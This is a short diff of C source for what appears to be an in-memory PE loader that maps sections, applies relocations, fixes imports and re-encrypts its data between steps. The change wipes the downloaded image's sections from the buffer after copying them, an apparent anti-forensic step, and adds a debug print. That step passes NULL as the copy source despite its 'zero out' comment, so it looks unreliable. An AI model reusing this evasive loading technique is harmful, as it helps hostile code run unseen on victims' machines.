@@ -68,6 +68,13 @@ PBYTE PreparePE(PPEHDRS pPeHdrs) {
 			(PVOID)(pPeHdrs->pPeBuffer + pPeHdrs->pSectHeader[i].PointerToRawData),  //Source = pointer to the current section's raw data
 			pPeHdrs->pSectHeader[i].SizeOfRawData									 //Size = size of the current section's raw data
 		);
+
+		//Zero out the PE's sections in the download buffer
+		mymemcpy(
+			(PVOID)(pPeHdrs->pPeBuffer + pPeHdrs->pSectHeader[i].PointerToRawData),
+			NULL,
+			pPeHdrs->pSectHeader[i].SizeOfRawData
+		);
 	}
 	DEBUG_PRINT("[*] Finished\n");
 
@@ -137,7 +144,6 @@ BOOL ApplyRelocations(PIMAGE_DATA_DIRECTORY pBaseRelocDir, ULONG_PTR pBaseAddr, 
 
 	//Encrypt again
 	Crypt(&temp);
-
 	return TRUE;
 }
 
@@ -228,7 +234,6 @@ BOOL FixImports(PIMAGE_DATA_DIRECTORY pImportTable, PBYTE pPeBaseAddr) {
 	}
 	//Encrypt
 	Crypt(&temp);
-
 	return TRUE;
 }
 
@@ -260,6 +265,7 @@ BOOL FixMem(ULONG_PTR pPeBaseAddr, PIMAGE_NT_HEADERS pNtHdrs, PIMAGE_SECTION_HEA
 		}
 
 		DEBUG_PRINT("[*] Checking memory protection for section: %d\n", i);
+		DEBUG_PRINT("\t> Section name: %s\n", pSectHdrs[i].Name);
 		//Get memory permissions based on section characteristics
 		if (pSectHdrs[i].Characteristics & IMAGE_SCN_MEM_WRITE) {
 			MemProtect = PAGE_WRITECOPY;
